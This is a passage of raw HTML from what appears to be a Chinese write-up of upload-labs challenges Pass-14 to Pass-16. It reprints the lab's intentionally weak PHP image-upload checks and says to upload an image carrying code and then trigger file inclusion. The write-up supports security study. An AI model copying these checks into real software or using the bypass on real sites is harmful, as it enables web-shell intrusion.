class=&#34;variable&#34;&gt;$file_type&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(move_uploaded_file(&lt;span class=&#34;variable&#34;&gt;$temp_file&lt;/span&gt;,&lt;span class=&#34;variable&#34;&gt;$img_path&lt;/span&gt;))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$is_upload&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;true&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;quot;上传出错！&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210311213940794.png&#34; alt=&#34;image-20210311213814876&#34;&gt;&lt;/p&gt;
&lt;p&gt;直接上传 b.jpg，再进行文件包含&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210311214019233.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210311214113434.png&#34; alt=&#34;image-20210311214113434&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;pass-14同13相同图片码&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pass-14同13相同图片码&#34;&gt;#&lt;/a&gt; Pass-14 (同 13 相同图片码)&lt;/h2&gt;
&lt;p&gt;题目源码&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;isImage&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$filename&lt;/span&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$types&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;.jpeg|.png|.gif&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(file_exists(&lt;span class=&#34;variable&#34;&gt;$filename&lt;/span&gt;))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$info&lt;/span&gt; = getimagesize(&lt;span class=&#34;variable&#34;&gt;$filename&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$ext&lt;/span&gt; = image_type_to_extension(&lt;span class=&#34;variable&#34;&gt;$info&lt;/span&gt;[&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(stripos(&lt;span class=&#34;variable&#34;&gt;$types&lt;/span&gt;,&lt;span class=&#34;variable&#34;&gt;$ext&lt;/span&gt;)&amp;gt;=&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$ext&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;false&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;false&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$is_upload&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;false&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;null&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;submit&amp;#x27;&lt;/span&gt;]))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$temp_file&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_FILES&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;upload_file&amp;#x27;&lt;/span&gt;][&lt;span class=&#34;string&#34;&gt;&amp;#x27;tmp_name&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$res&lt;/span&gt; = isImage(&lt;span class=&#34;variable&#34;&gt;$temp_file&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(!&lt;span class=&#34;variable&#34;&gt;$res&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;quot;文件未知，上传失败！&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$img_path&lt;/span&gt; = UPLOAD_PATH.&lt;span class=&#34;string&#34;&gt;&amp;quot;/&amp;quot;&lt;/span&gt;.rand(&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;99&lt;/span&gt;).date(&lt;span class=&#34;string&#34;&gt;&amp;quot;YmdHis&amp;quot;&lt;/span&gt;).&lt;span class=&#34;variable&#34;&gt;$res&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(move_uploaded_file(&lt;span class=&#34;variable&#34;&gt;$temp_file&lt;/span&gt;,&lt;span class=&#34;variable&#34;&gt;$img_path&lt;/span&gt;))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$is_upload&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;true&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;quot;上传出错！&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;pass-15同13相同图片码&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pass-15同13相同图片码&#34;&gt;#&lt;/a&gt; Pass-15 (同 13 相同图片码)&lt;/h2&gt;
&lt;p&gt;题目源码&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;isImage&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$filename&lt;/span&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;//需要开启php_exif模块&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$image_type&lt;/span&gt; = exif_imagetype(&lt;span class=&#34;variable&#34;&gt;$filename&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;switch&lt;/span&gt; (&lt;span class=&#34;variable&#34;&gt;$image_type&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;case&lt;/span&gt; IMAGETYPE_GIF:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;gif&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;case&lt;/span&gt; IMAGETYPE_JPEG:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;jpg&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;case&lt;/span&gt; IMAGETYPE_PNG:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;png&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;default&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;false&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$is_upload&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;false&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;null&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;submit&amp;#x27;&lt;/span&gt;]))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$temp_file&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_FILES&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;upload_file&amp;#x27;&lt;/span&gt;][&lt;span class=&#34;string&#34;&gt;&amp;#x27;tmp_name&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$res&lt;/span&gt; = isImage(&lt;span class=&#34;variable&#34;&gt;$temp_file&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(!&lt;span class=&#34;variable&#34;&gt;$res&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;quot;文件未知，上传失败！&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$img_path&lt;/span&gt; = UPLOAD_PATH.&lt;span class=&#34;string&#34;&gt;&amp;quot;/&amp;quot;&lt;/span&gt;.rand(&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;99&lt;/span&gt;).date(&lt;span class=&#34;string&#34;&gt;&amp;quot;YmdHis&amp;quot;&lt;/span&gt;).&lt;span class=&#34;string&#34;&gt;&amp;quot;.&amp;quot;&lt;/span&gt;.&lt;span class=&#34;variable&#34;&gt;$res&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(move_uploaded_file(&lt;span class=&#34;variable&#34;&gt;$temp_file&lt;/span&gt;,&lt;span class=&#34;variable&#34;&gt;$img_path&lt;/span&gt;))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$is_upload&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;true&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;quot;上传出错！&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;pass-16图片渲染绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pass-16图片渲染绕过&#34;&gt;#&lt;/a&gt; Pass-16 (图片渲染绕过)&lt;/h2&gt;
&lt;p&gt;题目源码&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span 